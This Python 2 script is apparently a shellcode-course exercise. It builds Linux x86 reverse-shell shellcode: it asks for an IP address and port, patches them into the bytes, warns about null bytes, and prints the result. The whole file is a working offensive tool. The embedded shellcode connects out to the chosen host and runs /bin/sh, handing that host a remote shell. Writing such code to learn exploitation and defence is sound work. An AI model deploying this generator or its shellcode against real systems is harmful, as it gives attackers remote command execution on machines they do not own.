#!/usr/bin/python
# Author: Ty Gast // SLAE-1461
# Reverse shell, default connect to 127.0.0.1 on port 4444

off_ip_high = 36
off_ip_highmid = 37
off_ip_lowmid = 38
off_ip_low = 39

off_port_high = 42
off_port_low = 43

shellcode = ('\x31\xc0\x50\x40\x89\xc3\x50\x40\x50\x89\xe1\xb0\x66\xcd\x80\x89\xc3\x89\xd9\x49\xb0\x3f\xcd\x80\x49\x79\xf9\x89\xde\x5b\x43\x5a\xc1\xe2\x04\x68\x7f\x00\x00\x01\x66\xb8\x11\x5c\xc1\xe0\x10\xb0\x02\x50\x89\xe1\x52\x51\x56\x89\xe1\x31\xc0\xb0\x66\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')

shellcode_ba = bytearray(shellcode)

def print_shellcode():
  print_shell = ''
  #for x in bytearray(shellcode):
  for x in shellcode_ba:
    print_shell += '\\x'
    print_shell += '%02x' % x
  print print_shell

def change_port(port):
  if (port & 0xff) == 0 or (port & 0xff00) == 0:
    print("WARNING: port " + str(port) + " puts null byte in the shellcode")
  if port != 4444:
    print("INFO: changing the port to " + str(port))
    print("INFO: Shellcode size: %d bytes" % len(shellcode_ba) )
    high = chr((port & 0xff00) >> 8)
    low = chr(port & 0xff)
    shellcode_ba[off_port_high] = high
    shellcode_ba[off_port_low] = low

newip = raw_input("Enter IP to connect to (enter to accept default 127.0.0.1): ")
if newip == "":
  print ("INFO: using the default IP 127.0.0.1")
  newip = "127.0.0.1"
else:
  octets = newip.split(".")
  zero = False
  for octet in octets:
    try:
      if int(octet) < 0 or int(octet) > 255:
        print ("ERROR: bad IP address entered, using 127.0.0.1")
        newip = "127.0.0.1"
        break
      if int(octet) == 0:
        zero = True
    except:
      print ("ERROR: bad IP address entered, using 127.0.0.1")
      newip = "127.0.0.1"
      break

print ("Using the IP address " + newip)
if newip != "127.0.0.1":
  if zero == True:
    print("WARNING: That new IP will result in null bytes in the shellcode")
  octets = newip.split(".")
  shellcode_ba[off_ip_high] = int(octets[0])
  shellcode_ba[off_ip_highmid] = int(octets[1])
  shellcode_ba[off_ip_lowmid] = int(octets[2])
  shellcode_ba[off_ip_low] = int(octets[3])

try:
  newport = input("Enter port to connect to (enter to accept default 4444): ")
except:
  print ("INFO: using the default port 4444")
  newport = 4444

if newport < 1 or newport > 65535:
  print ("ERROR: Invalid port selected, must be between 1 and 65535")
else:
  change_port(newport)
  print_shellcode()

